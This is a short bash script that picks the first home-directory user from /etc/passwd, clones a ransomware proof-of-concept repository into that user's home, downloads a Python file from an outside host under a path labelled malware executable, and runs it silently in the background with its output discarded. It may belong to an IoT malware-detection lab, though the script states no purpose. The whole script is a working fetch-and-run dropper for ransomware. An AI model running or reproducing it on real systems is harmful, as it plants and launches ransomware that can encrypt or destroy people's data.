#!/bin/bash

set -e

while IFS=: read -r username _ _ _ _ homedir _; do
    if [[ "$homedir" == "/home/"* ]]; then
        break
    fi
done < /etc/passwd

if [ -d "/home/$username/ransomware" ]; then
  rm -rf "/home/$username/ransomware"
fi

git clone https://github.com/jimmy-ly00/Ransomware-PoC.git /home/$username/ransomware

wget -q  "https://iotdet.eu.loclx.io/file/malware/11/executable/download/device" -O "/home/$username/ransomware_code.py"
#chmod +x "/home/$username/ransomware_code.sh"
nohup python3 /home/$username/ransomware_code.py > /dev/null 2>&1 &

